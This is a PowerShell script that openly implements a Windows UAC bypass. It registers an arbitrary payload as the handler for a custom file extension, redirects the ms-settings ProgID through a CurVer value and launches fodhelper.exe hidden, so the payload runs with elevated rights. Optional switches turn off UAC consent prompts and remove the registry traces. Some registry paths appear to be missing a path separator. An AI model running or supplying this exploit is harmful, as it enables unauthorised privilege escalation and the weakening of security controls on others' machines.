#!/usr/bin/env pwsh
# CurVer-Bypass.ps1
# UAC bypass using CurVer extension hijack variant
# This variant avoids DelegateExecute and uses extension redirection

param(
    [Parameter(Mandatory=$true)]
    [string]$PayloadPath,
    
    [string]$Extension = ".thm",
    
    [switch]$Cleanup,
    
    [switch]$DisableUAC
)

$msSettingsPath = "HKCU:\Software\Classes\ms-settings"
$extensionPath = "HKCU:\Software\Classes$Extension\Shell\Open\command"

Write-Host "=== CurVer Extension Hijack Bypass ===" -ForegroundColor Cyan

# Verify payload exists
if (-not (Test-Path $PayloadPath)) {
    Write-Host "ERROR: Payload not found at $PayloadPath" -ForegroundColor Red
    exit 1
}
Write-Host "[+] Payload verified: $PayloadPath" -ForegroundColor Green

# Create extension handler
Write-Host "`n[*] Creating extension handler..." -ForegroundColor Yellow
try {
    New-Item -Path "HKCU:\Software\Classes$Extension\Shell\Open" -Force | Out-Null
    New-ItemProperty -Path $extensionPath -Name "(default)" -Value $PayloadPath -Force | Out-Null
    Write-Host "[+] Extension handler created" -ForegroundColor Green
} catch {
    Write-Host "ERROR: Failed to create extension handler: $_" -ForegroundColor Red
    exit 1
}

# Redirect ms-settings
Write-Host "[*] Redirecting ms-settings ProgID..." -ForegroundColor Yellow
try {
    Set-ItemProperty -Path $msSettingsPath -Name "CurVer" -Value $Extension -Force
    Write-Host "[+] ms-settings redirected to $Extension" -ForegroundColor Green
} catch {
    Write-Host "ERROR: Failed to redirect ms-settings: $_" -ForegroundColor Red
    exit 1
}

# Trigger bypass
Write-Host "`n[*] Triggering fodhelper.exe..." -ForegroundColor Yellow
try {
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
    Write-Host "[+] fodhelper.exe executed" -ForegroundColor Green
} catch {
    Write-Host "ERROR: Failed to execute fodhelper.exe: $_" -ForegroundColor Red
}

# Optional: Disable UAC for persistence
if ($DisableUAC) {
    Write-Host "`n[*] Disabling UAC prompts..." -ForegroundColor Yellow
    try {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0 -Force
        Write-Host "[+] UAC prompts disabled" -ForegroundColor Green
    } catch {
        Write-Host "WARNING: Could not disable UAC: $_" -ForegroundColor Yellow
    }
}

# Cleanup
if ($Cleanup) {
    Write-Host "`n[*] Cleaning up..." -ForegroundColor Yellow
    try {
        Remove-Item -Path "HKCU:\Software\Classes$Extension" -Recurse -Force -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path $msSettingsPath -Name "CurVer" -Force -ErrorAction SilentlyContinue
        Write-Host "[+] Registry cleaned" -ForegroundColor Green
    } catch {
        Write-Host "WARNING: Could not clean up: $_" -ForegroundColor Yellow
    }
}

Write-Host "`n=== Bypass Complete ===" -ForegroundColor Cyan
